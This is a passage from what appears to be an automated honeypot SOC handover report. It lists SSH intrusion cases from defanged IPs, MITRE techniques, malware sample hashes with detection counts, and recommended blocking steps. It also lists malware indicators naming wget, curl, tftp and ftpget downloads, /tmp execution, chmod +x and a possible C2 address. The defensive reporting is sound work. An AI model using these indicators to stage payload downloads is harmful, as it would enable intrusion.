| `2026-08-09 12:23:31` | `cowrie.login.success` |
| `2026-08-09 12:23:32` | `cowrie.direct-tcpip.request` |
| `2026-08-09 12:23:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.34.128[.]202` to AbuseIPDB if not already reported
- [ ] Block `192.34.128[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8dd2b88d47e3

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-09 12:27 |
| **Last Seen** | 2026-08-09 12:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 12:27:57` | `cowrie.session.connect` |
| `2026-08-09 12:27:57` | `cowrie.client.version` |
| `2026-08-09 12:27:57` | `cowrie.client.kex` |
| `2026-08-09 12:27:57` | `cowrie.login.success` |
| `2026-08-09 12:27:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33f1b79c0980

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-09 12:27 |
| **Last Seen** | 2026-08-09 12:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 12:27:57` | `cowrie.session.connect` |
| `2026-08-09 12:27:57` | `cowrie.client.version` |
| `2026-08-09 12:27:57` | `cowrie.client.kex` |
| `2026-08-09 12:27:57` | `cowrie.login.success` |
| `2026-08-09 12:27:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48b5b1a1f553

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-09 12:28 |
| **Last Seen** | 2026-08-09 12:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 12:28:06` | `cowrie.session.connect` |
| `2026-08-09 12:28:06` | `cowrie.client.version` |
| `2026-08-09 12:28:06` | `cowrie.client.kex` |
| `2026-08-09 12:28:06` | `cowrie.login.success` |
| `2026-08-09 12:28:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-552a97fbc583

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-09 12:28 |
| **Last Seen** | 2026-08-09 12:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 12:28:06` | `cowrie.session.connect` |
| `2026-08-09 12:28:06` | `cowrie.client.version` |
| `2026-08-09 12:28:06` | `cowrie.client.kex` |
| `2026-08-09 12:28:06` | `cowrie.login.success` |
| `2026-08-09 12:28:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa1b3783bace

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]137` |
| **First Seen** | 2026-08-09 12:30 |
| **Last Seen** | 2026-08-09 12:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 12:30:02` | `cowrie.session.connect` |
| `2026-08-09 12:30:02` | `cowrie.client.version` |
| `2026-08-09 12:30:02` | `cowrie.client.kex` |
| `2026-08-09 12:30:04` | `cowrie.login.success` |
| `2026-08-09 12:30:04` | `cowrie.direct-tcpip.request` |
| `2026-08-09 12:30:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]137` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5683368f68fa

| Field | Detail |
|---|---|
| **Source IP** | `80.233.12[.]109` |
| **First Seen** | 2026-08-09 12:46 |
| **Last Seen** | 2026-08-09 12:46 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 12:46:43` | `cowrie.session.connect` |
| `2026-08-09 12:46:43` | `cowrie.client.version` |
| `2026-08-09 12:46:43` | `cowrie.client.kex` |
| `2026-08-09 12:46:45` | `cowrie.login.success` |
| `2026-08-09 12:46:45` | `cowrie.direct-tcpip.request` |
| `2026-08-09 12:46:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.233.12[.]109` to AbuseIPDB if not already reported
- [ ] Block `80.233.12[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a672cbc26862

| Field | Detail |
|---|---|
| **Source IP** | `118.163.145[.]175` |
| **First Seen** | 2026-08-09 12:46 |
| **Last Seen** | 2026-08-09 12:47 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 12:46:50` | `cowrie.session.connect` |
| `2026-08-09 12:46:51` | `cowrie.client.version` |
| `2026-08-09 12:46:51` | `cowrie.client.kex` |
| `2026-08-09 12:46:54` | `cowrie.login.success` |
| `2026-08-09 12:46:55` | `cowrie.direct-tcpip.request` |
| `2026-08-09 12:47:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.163.145[.]175` to AbuseIPDB if not already reported
- [ ] Block `118.163.145[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `45.79.102[.]191` | **121** | 2026-08-09 10:13 | 2026-08-09 10:17 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **9** | 2026-08-09 09:05 | 2026-08-09 12:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | **6** | 2026-08-09 11:03 | 2026-08-09 11:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | **4** | 2026-08-09 09:07 | 2026-08-09 10:46 | 2m | 0 | `T1592` | 🟢 LOW |
| `116.110.215[.]21` | **3** | 2026-08-09 10:13 | 2026-08-09 10:31 | 3m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]123` | **3** | 2026-08-09 12:17 | 2026-08-09 12:17 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]164` | **3** | 2026-08-09 10:50 | 2026-08-09 10:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]166` | **3** | 2026-08-09 09:34 | 2026-08-09 09:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]98` | **3** | 2026-08-09 10:47 | 2026-08-09 10:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]66` | **3** | 2026-08-09 10:46 | 2026-08-09 10:47 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]96` | **3** | 2026-08-09 10:48 | 2026-08-09 10:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]123` | **3** | 2026-08-09 09:03 | 2026-08-09 09:03 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]123` | **3** | 2026-08-09 11:44 | 2026-08-09 11:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.238.181[.]94` | **3** | 2026-08-09 10:25 | 2026-08-09 10:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `116.99.171[.]175` | **2** | 2026-08-09 10:14 | 2026-08-09 10:42 | 2m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `18.116.101[.]220` | **2** | 2026-08-09 09:37 | 2026-08-09 09:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `181.46.166[.]110` | **2** | 2026-08-09 09:30 | 2026-08-09 09:30 | 0m | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]127` | **2** | 2026-08-09 10:59 | 2026-08-09 10:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]209` | **2** | 2026-08-09 10:57 | 2026-08-09 11:19 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.118.209[.]123` | **2** | 2026-08-09 12:29 | 2026-08-09 12:29 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.206.32[.]46` | **2** | 2026-08-09 08:55 | 2026-08-09 08:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `116.181.17[.]132` | 1 | 2026-08-09 11:19 | 2026-08-09 11:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.50.70[.]169` | 1 | 2026-08-09 11:43 | 2026-08-09 11:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.52.18[.]141` | 1 | 2026-08-09 11:26 | 2026-08-09 11:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.52.18[.]252` | 1 | 2026-08-09 11:40 | 2026-08-09 11:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.66.63[.]189` | 1 | 2026-08-09 11:13 | 2026-08-09 11:14 | 8s | 0 | `T1592` | 🟢 LOW |
| `125.91.35[.]169` | 1 | 2026-08-09 11:22 | 2026-08-09 11:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `164.92.115[.]22` | 1 | 2026-08-09 09:25 | 2026-08-09 09:25 | 1s | 0 | `T1592` | 🟢 LOW |
| `175.161.46[.]128` | 1 | 2026-08-09 10:53 | 2026-08-09 10:53 | 11s | 0 | `T1592` | 🟢 LOW |
| `177.87.203[.]41` | 1 | 2026-08-09 11:53 | 2026-08-09 11:53 | 10s | 0 | `T1592` | 🟢 LOW |
| `181.117.77[.]9` | 1 | 2026-08-09 10:32 | 2026-08-09 10:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `190.71.186[.]52` | 1 | 2026-08-09 10:48 | 2026-08-09 10:48 | 11s | 0 | `T1592` | 🟢 LOW |
| `190.97.239[.]30` | 1 | 2026-08-09 09:12 | 2026-08-09 09:12 | 11s | 0 | `T1592` | 🟢 LOW |
| `200.25.137[.]73` | 1 | 2026-08-09 12:12 | 2026-08-09 12:12 | 13s | 0 | `T1592` | 🟢 LOW |
| `38.51.234[.]40` | 1 | 2026-08-09 12:06 | 2026-08-09 12:06 | 10s | 0 | `T1592` | 🟢 LOW |
| `39.174.42[.]18` | 1 | 2026-08-09 10:54 | 2026-08-09 10:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.160.190[.]10` | 1 | 2026-08-09 10:08 | 2026-08-09 10:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.162.244[.]130` | 1 | 2026-08-09 11:46 | 2026-08-09 11:47 | 10s | 0 | `T1592` | 🟢 LOW |
| `45.184.57[.]172` | 1 | 2026-08-09 10:02 | 2026-08-09 10:03 | 10s | 0 | `T1592` | 🟢 LOW |
| `45.79.5[.]11` | 1 | 2026-08-09 12:36 | 2026-08-09 12:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.151[.]64` | 1 | 2026-08-09 11:55 | 2026-08-09 11:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.152[.]248` | 1 | 2026-08-09 11:50 | 2026-08-09 11:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `5.59.170[.]252` | 1 | 2026-08-09 10:37 | 2026-08-09 10:37 | 14s | 0 | `T1592` | 🟢 LOW |
| `59.34.17[.]130` | 1 | 2026-08-09 11:52 | 2026-08-09 11:52 | 8s | 0 | `T1592` | 🟢 LOW |
| `61.145.181[.]7` | 1 | 2026-08-09 11:52 | 2026-08-09 11:52 | 33s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]142` | 1 | 2026-08-09 12:47 | 2026-08-09 12:47 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]199` | 1 | 2026-08-09 09:55 | 2026-08-09 09:56 | 15s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-08-09 12:01 | 2026-08-09 12:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `87.97.60[.]168` | 1 | 2026-08-09 11:00 | 2026-08-09 11:00 | 12s | 0 | `T1592` | 🟢 LOW |
| `91.210.250[.]91` | 1 | 2026-08-09 12:37 | 2026-08-09 12:37 | 13s | 0 | `T1592` | 🟢 LOW |
| `93.171.79[.]119` | 1 | 2026-08-09 11:37 | 2026-08-09 11:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]36` | 1 | 2026-08-09 10:20 | 2026-08-09 10:20 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 30/100 | 🟢 LOW | Not in VT |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 84/100 | 🔴 HIGH | **36/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 30/100 | 🟢 LOW | Not in VT |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `111.70.32[.]49` | TW | CHT-Mobile business Group,Chunghwa | **100** ⚠️ | 0 |
| `45.162.244[.]130` | BR | ULTRA FIBER INTERNET LTDA - ME | **100** ⚠️ | 0 |
| `178.178.194[.]137` | RU | Metropolitan branch of PJSC MegaFon | **100** ⚠️ | 50 |
| `192.34.128[.]202` | US | Zito Media | **100** ⚠️ | 50 |
| `121.66.63[.]189` | KR | LG Uplus | **100** ⚠️ | 50 |
| `120.52.18[.]141` | CN | CHINA UNICOM CLOUD DATA COMPANY LIMITED | **100** ⚠️ | 4 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `49.124.152[.]248` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 50 |
| `91.233.83[.]203` | GB | Andrew Millar Ltd | **100** ⚠️ | 10 |
| `196.190.41[.]137` | ET | REFUGEE_COUNCIL | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 155 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 132 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 18 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 18 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 18 |

---

## 🔕 False Positive Summary (55 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 15 |
| AbuseIPDB score 16 below threshold 25 | 5 |
| AbuseIPDB score 3 below threshold 25 | 2 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 29 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 402 cases |
| Tool 34  | Credential Extractor        | ✅ 473 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 18 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 139 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 55 filtered (13.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 101 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 22 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 132 priority case(s) shown individually · 52 recon entry/entries in table (21 group(s) consolidating 184 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
